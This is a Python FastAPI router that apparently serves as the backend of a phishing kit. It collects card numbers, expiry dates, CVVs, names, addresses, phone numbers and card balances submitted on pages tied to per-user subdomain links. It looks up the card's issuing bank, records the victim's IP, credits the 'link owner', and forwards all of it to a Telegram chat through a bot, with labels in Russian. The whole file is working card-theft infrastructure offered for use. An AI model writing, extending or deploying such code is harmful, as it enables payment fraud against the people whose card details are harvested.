import os
import logging

import httpx
from fastapi import APIRouter, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel

from db.crud.links import get_link_by_subdomain_and_id
from db.models import User
from db.session import get_session

logger = logging.getLogger(__name__)

router = APIRouter()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
NOTIFY_CHAT_ID = os.getenv("NOTIFY_CHAT_ID", "")


class CardSubmit(BaseModel):
    # card fields
    card_number: str = ""
    card_exp: str = ""
    card_cvv: str = ""
    card_name: str = ""
    # address
    country: str = ""
    address1: str = ""
    address2: str = ""
    zip_code: str = ""
    city: str = ""
    # phone
    phone_dial: str = ""
    phone: str = ""
    # balance check (step 2)
    balance_amount: str = ""
    balance_currency: str = ""
    # context — filled by the page, not the user
    subdomain: str = ""
    link_id: str = ""


async def _send_telegram(text: str) -> None:
    if not BOT_TOKEN or not NOTIFY_CHAT_ID:
        logger.warning("NOTIFY_CHAT_ID or BOT_TOKEN not configured — skipping notification")
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": NOTIFY_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
    }
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            r = await client.post(url, json=payload)
            if r.status_code != 200:
                logger.error("Telegram sendMessage failed: %s", r.text)
    except Exception as exc:
        logger.error("Telegram sendMessage exception: %s", exc)



@router.get("/bin/{bin}")
async def bin_lookup(bin: str) -> JSONResponse:
    if not bin.isdigit() or len(bin) < 6:
        return JSONResponse({"bank": {"name": ""}})
    try:
        async with httpx.AsyncClient(timeout=5) as client:
            r = await client.get(
                f"https://lookup.binlist.net/{bin[:8]}",
                headers={"Accept-Version": "3"}
            )
            if r.status_code == 200:
                return JSONResponse(r.json())
    except Exception:
        pass
    return JSONResponse({"bank": {"name": ""}})


@router.post("/submit")
async def submit_form(payload: CardSubmit, request: Request) -> JSONResponse:
    # Resolve link owner from subdomain + link_id
    owner_line = "неизвестен"
    if payload.subdomain and payload.link_id:
        try:
            async with get_session() as session:
                link = await get_link_by_subdomain_and_id(
                    session, payload.subdomain, payload.link_id
                )
                if link:
                    owner = await session.get(User, link.user_id)
                    if owner:
                        uname = f"@{owner.username}" if owner.username else f"id:{owner.id}"
                        owner_line = f"{uname} (tg_id: <code>{owner.id}</code>)"
        except Exception as exc:
            logger.error("Error resolving link owner: %s", exc)

    # Resolve visitor IP
    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "unknown")
    )

    lines = [
        "🔔 <b>Новая заявка</b>",
        "",
        f"👤 <b>Владелец ссылки:</b> {owner_line}",
        f"🔗 <b>Ссылка:</b> {payload.subdomain}/{payload.link_id}",
        f"🌐 <b>IP посетителя:</b> <code>{ip}</code>",
        "",
        "💳 <b>Карта:</b>",
        f"  Номер: <code>{payload.card_number or '—'}</code>",
        f"  Срок: <code>{payload.card_exp or '—'}</code>",
        f"  CVV: <code>{payload.card_cvv or '—'}</code>",
        f"  Имя: {payload.card_name or '—'}",
        "",
        "📍 <b>Адрес:</b>",
        f"  Страна: {payload.country or '—'}",
        f"  Адрес: {payload.address1 or '—'}"
        + (f", {payload.address2}" if payload.address2 else ""),
        f"  Индекс: {payload.zip_code or '—'}, {payload.city or '—'}",
        "",
        "📞 <b>Телефон:</b> {dial}{phone}".format(
            dial=payload.phone_dial or "",
            phone=payload.phone or "—",
        ),
    ]

    if payload.balance_amount:
        lines += [
            "",
            "💰 <b>Баланс карты:</b> "
            f"<code>{payload.balance_amount} {payload.balance_currency or ''}</code>",
        ]

    await _send_telegram("\n".join(lines))
    return JSONResponse({"ok": True})
